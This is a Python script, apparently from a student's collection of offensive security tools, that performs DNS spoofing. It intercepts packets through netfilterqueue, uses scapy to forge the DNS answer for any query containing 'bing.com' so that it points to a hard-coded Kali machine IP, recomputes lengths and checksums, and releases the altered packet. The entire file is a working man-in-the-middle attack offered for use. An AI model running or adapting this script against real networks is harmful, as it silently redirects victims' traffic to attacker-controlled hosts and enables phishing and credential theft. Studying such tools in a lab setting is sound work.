# coding=utf-8                                                                  

"""                                                                             
    Security - Multiples offencives Tools                                       
    Copyright (C) 2019 nbeny                                               
    <nbeny@student.42.fr>                                                       
    This program is free software: you can redistribute it and/or modify        
    it under the terms of the GNU General Public License as published by        
    the Free Software Foundation, either version 3 of the License, or           
    (at your option) any later version.                                         
    This program is distributed in the hope that it will be useful,             
    but WITHOUT ANY WARRANTY; without even the implied warranty of              
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               
    GNU General Public License for more details.                                
    You should have received a copy of the GNU General Public License           
    along with this program.  If not, see <https://www.gnu.org/licenses/>.      
"""

#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

kali_ip = "10.0.2.6"

def process_packet(packet):
    # print(packet)
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=kali_ip)
            # an is the number of DNS redirect in packet
            scapy_packet[scapy.DNS].an = answer
            # ancount is the number of DNS redirect in packet
            scapy_packet[scapy.DNS].ancount = 1

            # scapy rebuild this field automaticly if we delete
            # len of the IP part and a security chksum to know if we change it
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            # len of the UDP part and a security chksum to know if we change it
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

        # print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
